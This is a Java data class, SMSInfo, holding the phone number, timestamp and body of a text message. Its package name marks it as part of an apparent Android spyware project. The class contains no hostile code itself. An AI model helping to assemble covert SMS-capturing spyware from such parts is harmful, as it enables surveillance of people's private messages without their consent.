package com.example.tienbi.appspyware.mode;

/**
 * Created by TienBi on 15/09/2016.
 */
public class SMSInfo {
    private String phoneNumber;
    private String timeStamp;
    private String body;
    public String getPhoneNumber() {
        return phoneNumber;
    }
    public void setPhoneNumber(String phoneNumber) {
        this.phoneNumber = phoneNumber;
    }
    public String getTimeStamp() {
        return timeStamp;
    }
    public void setTimeStamp(String timeStamp) {
        this.timeStamp = timeStamp;
    }
    public String getBody() {
        return body;
    }
    public void setBody(String body) {
        this.body = body;
    }
}
